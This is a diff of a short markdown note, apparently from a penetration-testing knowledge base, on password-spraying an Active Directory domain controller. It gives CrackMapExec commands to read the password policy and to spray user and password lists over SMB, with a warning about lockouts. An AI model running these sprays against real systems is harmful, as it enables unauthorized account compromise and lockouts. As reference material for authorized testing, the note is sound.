@@ -29,13 +29,21 @@ Password spray a domain in attempt to guess passwords from password dictionary l
 
 Password spray a domain in attempt to guess passwords from password dictionary list. When you have a username but no password
 
+
+
 ## Objective
 
 1. Try to find the password to valid credentials
 
+
+
 # Instructions
 
 1. (Optional) Try to get password policy to understand complex requirement of password
+
+
+
+
 
 **Command** ([[CrackMapExec get password policy]]):
 
@@ -43,9 +51,17 @@ Password spray a domain in attempt to guess passwords from password dictionary l
 crackmapexec $IP -u $USERNAME -p $PASSWORD --pass-pol
 ```
 
+
+
+
+
 2. Password Spray DC
 
+
+
 Spray single user/pass
+
+
 
 **Command** ([[CrackMapExec test single user/pass]]):
 
@@ -53,13 +69,23 @@ Spray single user/pass
 crackmapexec smb $DC_IP -u user.text -p password.text --no-bruteforce
 ```
 
+
+
 Spray multi user/pass, can be locked from rate policy
+
+
+
+
 
 **Command** ([[CrackmapExec spray multi user/pass]]):
 
 ```bash
 crackmapexec smb $DC_IP -u user.text -p password.text
 ```
+
+
+
+
 
 ## Platforms
 
@@ -75,3 +101,5 @@ crackmapexec smb $DC_IP -u user.text -p password.text
 
 - [[Enumeration]]
 - [[Password Spray]]
+
+
